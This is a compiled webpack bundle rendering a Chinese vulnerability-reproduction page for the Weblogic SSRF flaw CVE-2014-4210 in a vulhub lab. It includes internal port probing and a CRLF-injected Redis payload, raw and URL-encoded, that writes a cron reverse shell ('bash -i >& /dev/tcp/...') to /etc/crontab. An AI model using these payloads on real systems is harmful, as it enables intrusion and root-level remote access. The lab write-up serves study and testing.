(window.webpackJsonp=window.webpackJsonp||[]).push([[60],{2773:function(s,t,e){s.exports=e.p+"assets/img/1627122010908-dfbdc992-8a59-4638-b56d-404f0b538c7e.ffbcd98d.png"},2774:function(s,t,e){s.exports=e.p+"assets/img/1627122062901-5664349d-68fe-4128-a6d6-ec843fefd82d.85fd2c50.png"},2775:function(s,t,e){s.exports=e.p+"assets/img/1627122076972-b0156bf5-41a6-4b62-9cc3-2d526f092083.84ec3ab2.png"},2776:function(s,t,e){s.exports=e.p+"assets/img/1627122081877-63d635ee-e032-4d56-a627-27606bdf334f.9cc9a235.png"},2777:function(s,t,e){s.exports=e.p+"assets/img/1627122086475-d48ce9eb-a76c-4daa-94b1-fce15687b76e.86d48b62.png"},2778:function(s,t,e){s.exports=e.p+"assets/img/1627122093990-acdd4a50-b1ff-493f-8c86-dcd2e1445641.e326b73f.png"},3445:function(s,t,e){"use strict";e.r(t);var a=e(64),r=Object(a.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"weblogic-ssrf漏洞-cve-2014-4210"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#weblogic-ssrf漏洞-cve-2014-4210"}},[s._v("#")]),s._v(" Weblogic SSRF漏洞 CVE-2014-4210")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Oracle WebLogic Server 10.0.2.0")]),t("br"),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Oracle WebLogic Server 10.3.6.0")]),t("br"),s._v(" "),t("h2",{attrs:{id:"环境搭建"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("git clone https://github.com/vulhub/vulhub.git\ncd vulhub/weblogic/ssrd\ndocker-compose up -d\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("访问 "),t("code",[s._v("http://xxx.xxx.xxx.xxx:7001")]),s._v(" 正常即可")]),s._v(" "),t("p",[t("img",{attrs:{src:e(2773),alt:"img"}})]),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("出现漏洞的 URL为 : "),t("code",[s._v("http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp")])]),s._v(" "),t("p",[t("img",{attrs:{src:e(2774),alt:"img"}})]),s._v(" "),t("p",[s._v("使用 payload 进行探测, 将探测的位置写在 operator参数中")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("注意需要知道内网 IP")]),t("br"),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("通过查看报错内容来进行判断")]),s._v(" "),t("p",[t("img",{attrs:{src:e(2775),alt:"img"}})]),s._v(" "),t("p",[s._v("存在的报错内容如图，关键字为 "),t("code",[s._v("404")]),s._v(" ,例如把 "),t("code",[s._v("operator")]),s._v(" 参数改成 "),t("code",[s._v("http://xxx.xxx.xxx.xxx:7000")]),s._v(" 这样不存在的则报错内容如下图")]),s._v(" "),t("p",[t("img",{attrs:{src:e(2776),alt:"img"}})]),s._v(" "),t("p",[s._v("通过这样的方法就可以探测内网的开放端口情况，例如内网中有一台主机 "),t("code",[s._v("IP：172.19.0.2")]),s._v(" 开启"),t("code",[s._v("6379端口的redis服务")])]),s._v(" "),t("p",[t("img",{attrs:{src:e(2777),alt:"img"}})]),s._v(" "),t("p",[s._v("如果访问的非http协议，则会返回"),t("code",[s._v("did not have a valid SOAP content-type")]),s._v("，这样通过错误的不同，即可探测内网状态。")]),s._v(" "),t("p",[s._v("Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入"),t("code",[s._v("%0a%0d")]),s._v("来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。")]),s._v(" "),t("p",[s._v("发送三条redis命令，将弹shell脚本写入"),t("code",[s._v("/etc/crontab")]),s._v(" 中：")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1"),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /etc/\nconfig "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("crontab")]),s._v("\nsave\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("接着再将请求进行 "),t("code",[s._v("url编码")])]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("注意，换行符是“\\r\\n”，也就是“%0D%0A”")]),t("br"),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[s._v("test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("发送payload")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[s._v("/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("name"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("txtSearchname")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("sdf"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("txtSearchkey")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("txtSearchfor")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("selfor")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Business+location"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("btnSubmit")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Search"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("operator")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("发送后监听 "),t("code",[s._v("172.19.0.3 9999端口")]),s._v("等待反弹shell")]),s._v(" "),t("p",[t("img",{attrs:{src:e(2778),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);